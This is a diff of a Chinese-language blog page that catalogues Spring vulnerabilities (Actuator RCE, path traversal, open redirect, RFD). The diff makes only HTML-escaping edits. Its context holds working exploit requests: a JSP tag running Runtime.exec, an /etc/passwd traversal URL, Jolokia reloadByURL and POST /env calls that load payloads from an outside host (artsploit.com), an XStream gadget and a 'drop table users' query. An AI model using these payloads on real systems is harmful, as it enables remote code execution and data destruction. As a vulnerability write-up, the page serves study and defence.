@@ -155,14 +155,14 @@ class.classLoader.URLs[0] &#x3D; jar:http:&#x2F;&#x2F;attacker&#x2F;spring-explo
 <pre class="line-numbers language-none"><code class="language-none">- META-INF&#x2F;spring-form.tld - 定义spring表单标签并指定实现为标签文件而不是类
 - META-INF&#x2F;tags&#x2F;中的标签文件，包含有标签定义（任意Java代码）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p>/META-INF/spring-form.tld文件：</p>
+<p>&#x2F;META-INF&#x2F;spring-form.tld文件：</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;!-- &lt;form:input&#x2F;&gt; tag --&gt;
 	&lt;tag-file&gt;
     &lt;name&gt;input&lt;&#x2F;name&gt;
     &lt;path&gt;&#x2F;META-INF&#x2F;tags&#x2F;InputTag.tag&lt;&#x2F;path&gt;
   &lt;&#x2F;tag-file&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>/META-INF/tags/InputTag.tag</p>
+<p>&#x2F;META-INF&#x2F;tags&#x2F;InputTag.tag</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;%@ tag dynamic-attributes&#x3D;&quot;dynattrs&quot; %&gt;
 &lt;%
  j java.lang.Runtime.getRuntime().exec(&quot;mkdir &#x2F;tmp&#x2F;PWNED&quot;); 
@@ -352,10 +352,10 @@ Spring Data REST 3.0至3.0.6（Kay SR6）<span aria-hidden="true" class="line-nu
 <h3 id="CVE-2018-1271-Spring-MVC-目录穿越漏洞"><a href="#CVE-2018-1271-Spring-MVC-目录穿越漏洞" class="headerlink" title="CVE-2018-1271 Spring MVC 目录穿越漏洞"></a>CVE-2018-1271 Spring MVC 目录穿越漏洞</h3><p>当Spring MVC的静态资源存放在Windows系统上时，攻击可以通过构造特殊URL导致目录遍历漏洞。</p>
 <p>此漏洞触发条件较高：</p>
 <ol>
-<li> Server运行于Windows系统上</li>
-<li> 从文件系统提供的文件服务（比如使用file协议，但不是file open）</li>
-<li> 没有使用CVE-2018-1199漏洞的补丁</li>
-<li> 不使用Tomcat或者是WildFly做Server</li>
+<li>Server运行于Windows系统上</li>
+<li>从文件系统提供的文件服务（比如使用file协议，但不是file open）</li>
+<li>没有使用CVE-2018-1199漏洞的补丁</li>
+<li>不使用Tomcat或者是WildFly做Server</li>
 </ol>
 <p>漏洞利用和复现: </p>
 <p><a target="_blank" rel="noopener" href="https://blog.knownsec.com/2018/08/spring-mvc-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9Ecve-2018-1271%E5%88%86%E6%9E%90/">https://blog.knownsec.com/2018/08/spring-mvc-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9Ecve-2018-1271%E5%88%86%E6%9E%90/</a></p>
@@ -402,7 +402,7 @@ Spring Security OAuth 2.0到2.0.15<span aria-hidden="true" class="line-numbers-r
 <p>构建成功后访问：</p>
 <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;test&#x2F;pathtraversal&#x2F;master&#x2F;..%252f..%252f..%252f..%252f..&#x2F;etc&#x2F;passwd    <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>![image-20200401100511941](Spring 漏洞.assets/image-20200401100511941.png)</p>
+<p>![image-20200401100511941](Spring 漏洞.assets&#x2F;image-20200401100511941.png)</p>
 <p>其中路径代表：<code>/&#123;name&#125;/&#123;profile&#125;/&#123;label&#125;/</code>，如下中所显示的json。</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131715.png" alt="image-20200401102213915"></p>
 <h3 id="CVE-2019-3778-Spring-Security-OAuth-开放重定向"><a href="#CVE-2019-3778-Spring-Security-OAuth-开放重定向" class="headerlink" title="CVE-2019-3778 Spring Security OAuth 开放重定向"></a>CVE-2019-3778 Spring Security OAuth 开放重定向</h3><p>影响版本：</p>
@@ -425,7 +425,7 @@ Spring Security OAuth 2.0 to 2.0.16<span aria-hidden="true" class="line-numbers-
 <h3 id="CNVD-2019-11630-Spring-Boot-Actuator命令执行漏洞"><a href="#CNVD-2019-11630-Spring-Boot-Actuator命令执行漏洞" class="headerlink" title="CNVD-2019-11630 Spring Boot Actuator命令执行漏洞"></a>CNVD-2019-11630 Spring Boot Actuator命令执行漏洞</h3><p><a target="_blank" rel="noopener" href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators#">https://www.veracode.com/blog/research/exploiting-spring-boot-actuators#</a></p>
 <p>这个漏洞并不像是单一的问题产生，更像是一个渗透入侵的过程。有很多值得在意的知识点</p>
 <ol>
-<li> Spring Boot 1-1.4，无需身份验证即可访问以下敏感路径，而在2.x中，存在于/actuator路径下。</li>
+<li>Spring Boot 1-1.4，无需身份验证即可访问以下敏感路径，而在2.x中，存在于&#x2F;actuator路径下。</li>
 </ol>
 <pre class="line-numbers language-none"><code class="language-none">&#x2F;dump-显示线程转储（包括堆栈跟踪）
 &#x2F;trace-显示最后几条HTTP消息（其中可能包含会话标识符）
@@ -436,7 +436,7 @@ Spring Security OAuth 2.0 to 2.0.16<span aria-hidden="true" class="line-numbers-
 &#x2F;restart-重新启动应用程序<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <ol start="2">
-<li> jolokia进行远程代码执行，Jolokia允许通过HTTP访问所有已注册的MBean，并且旨在执行与JMX相同的操作。可以使用URL列出所有可用的MBeans操作：<a target="_blank" rel="noopener" href="http://127.0.0.1:8090/jolokia/list">http://127.0.0.1:8090/jolokia/list</a></li>
+<li>jolokia进行远程代码执行，Jolokia允许通过HTTP访问所有已注册的MBean，并且旨在执行与JMX相同的操作。可以使用URL列出所有可用的MBeans操作：<a target="_blank" rel="noopener" href="http://127.0.0.1:8090/jolokia/list">http://127.0.0.1:8090/jolokia/list</a></li>
 </ol>
 <p>Logback库提供的<strong>reloadByURL</strong>操作使我们可以从外部URL重新加载日志配置，地址如：</p>
 <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;localhost:8090&#x2F;jolokia&#x2F;exec&#x2F;ch.qos.logback.classic:Name&#x3D;default,Type&#x3D;ch.qos.logback.classic.jmx.JMXConfigurator&#x2F;reloadByURL&#x2F;http:!&#x2F;!&#x2F;artsploit.com!&#x2F;logback.xml
@@ -448,9 +448,9 @@ logback.xml：
 
 <p>reloadByURL功能从<a target="_blank" rel="noopener" href="http://artsploit.com/logback.xml%E4%B8%8B%E8%BD%BD%E6%96%B0%E9%85%8D%E7%BD%AE%EF%BC%8C%E5%B9%B6%E5%B0%86%E5%85%B6%E8%A7%A3%E6%9E%90%E4%B8%BALogback%E9%85%8D%E7%BD%AE%E3%80%82%E8%BF%99%E5%B0%B1%E5%AF%BC%E8%87%B4%E4%B8%A4%E4%B8%AA%E9%97%AE%E9%A2%98%EF%BC%9AXXE%E7%9B%B2%E6%94%BB%E5%87%BB%E3%80%81%E6%81%B6%E6%84%8FLDAP%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E5%BC%95%E7%94%A8%E5%AF%BC%E8%87%B4RCE%E3%80%82">http://artsploit.com/logback.xml下载新配置，并将其解析为Logback配置。这就导致两个问题：XXE盲攻击、恶意LDAP服务器解析引用导致RCE。</a></p>
 <ol start="3">
-<li> 通过/env来修改配置</li>
+<li>通过&#x2F;env来修改配置</li>
 </ol>
-<p>如果Spring Cloud Libraries在类路径中，则**’/ env’**端点允许您修改Spring环境属性。</p>
+<p>如果Spring Cloud Libraries在类路径中，则**’&#x2F; env’**端点允许您修改Spring环境属性。</p>
 <pre class="line-numbers language-html" data-language="html"><code class="language-html">POST /env HTTP/1.1
 Host: 127.0.0.1:8090
 Content-Type: application/x-www-form-urlencoded
@@ -498,9 +498,9 @@ eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream<span aria-hi
   &lt;&#x2F;jdk.nashorn.internal.objects.NativeString&gt;
 &lt;&#x2F;linked-hash-set&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>然后调用’/ refresh’端点。</p>
+<p>然后调用’&#x2F; refresh’端点。</p>
 <ol start="4">
-<li> 有一种通过Spring环境属性修改来实现RCE的更可靠方法：</li>
+<li>有一种通过Spring环境属性修改来实现RCE的更可靠方法：</li>
 </ol>
 <pre class="line-numbers language-html" data-language="html"><code class="language-html">POST /env HTTP/1.1
 Host: 127.0.0.1:8090
@@ -509,7 +509,7 @@ Content-Length: 59
  
 spring.cloud.bootstrap.location=http://artsploit.com/yaml-payload.yml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>该请求修改了“ spring.cloud.bootstrap.location”属性，该属性用于加载外部配置并以YAML格式解析它。为了做到这一点，我们还需要调用“/refresh”端点。</p>
+<p>该请求修改了“ spring.cloud.bootstrap.location”属性，该属性用于加载外部配置并以YAML格式解析它。为了做到这一点，我们还需要调用“&#x2F;refresh”端点。</p>
 <pre class="line-numbers language-html" data-language="html"><code class="language-html">POST /refresh HTTP/1.1
 Host: 127.0.0.1:8090
 Content-Type: application/x-www-form-urlencoded
@@ -524,11 +524,11 @@ Content-Length: 0<span aria-hidden="true" class="line-numbers-rows"><span></span
 
 <p>该jar文件的反序列化将触发提供的URLClassLoader的ScriptEngineManager构造函数的执行。jar文件可以在如下地址找到：<a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p>
 <ol start="5">
-<li> /env配置</li>
+<li>&#x2F;env配置</li>
 </ol>
 <p>除了关于执行RCE的地方，还有一些设置也很有用。</p>
-<p>**spring.datasource.tomcat.validationQuery = drop + table + users-**允许您指定任何SQL查询，它将针对当前数据库自动执行。它可以是任何语句，包括插入，更新或删除。</p>
-<p><strong>spring.datasource.tomcat.url</strong> = jdbc:hsqldb:<a target="_blank" rel="noopener" href="https://localhost:3002/xdb%E5%85%81%E8%AE%B8%E6%82%A8%E4%BF%AE%E6%94%B9%E5%BD%93%E5%89%8D%E7%9A%84JDBC%E8%BF%9E%E6%8E%A5%E5%AD%97%E7%AC%A6%E4%B8%B2%E3%80%82">https://localhost:3002/xdb允许您修改当前的JDBC连接字符串。</a></p>
+<p>**spring.datasource.tomcat.validationQuery &#x3D; drop + table + users-**允许您指定任何SQL查询，它将针对当前数据库自动执行。它可以是任何语句，包括插入，更新或删除。</p>
+<p><strong>spring.datasource.tomcat.url</strong> &#x3D; jdbc:hsqldb:<a target="_blank" rel="noopener" href="https://localhost:3002/xdb%E5%85%81%E8%AE%B8%E6%82%A8%E4%BF%AE%E6%94%B9%E5%BD%93%E5%89%8D%E7%9A%84JDBC%E8%BF%9E%E6%8E%A5%E5%AD%97%E7%AC%A6%E4%B8%B2%E3%80%82">https://localhost:3002/xdb允许您修改当前的JDBC连接字符串。</a></p>
 <p>这种设置只在1.x中，在Spring Boot 2.x中，改为了json格式。</p>
 <h3 id="CVE-2019-11269-Spring-Security-OAuth-开放重定向"><a href="#CVE-2019-11269-Spring-Security-OAuth-开放重定向" class="headerlink" title="CVE-2019-11269 Spring Security OAuth 开放重定向"></a>CVE-2019-11269 Spring Security OAuth 开放重定向</h3><p>此漏洞为CVE-2019-3778的延伸版本，效果一致</p>
 <p>影响版本：</p>
@@ -546,7 +546,7 @@ Click me, Im a dolphin
 <p>先准备一个受控制的配置文件等，上传到受信的服务器中，虽然对服务器不造成影响。但是可以在其中注入一些payload。</p>
 <p>由于下载的文件名是受前端控制，发送filename的时候可以自己构造文件名下载。</p>
 <p>spring对不能识别的文件下载的时候按照json格式来处理，但是url仍然可以使用。</p>
-<p>当受害者点击如上的地址时，会下载一个<attacker_id>.cmd执行文件。原来spring对这种问题的处理是添加后缀为txt来改变文件的可执行效果。</p>
+<p>当受害者点击如上的地址时，会下载一个<attacker_id>.cmd执行文件。原来spring对这种问题的处理是添加后缀为txt来改变文件的可执行效果。</attacker_id></p>
 <p>但是这个设置可以绕过，采用如下形式：</p>
 <pre class="line-numbers language-none"><code class="language-none">filename：secure_install.cmd&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
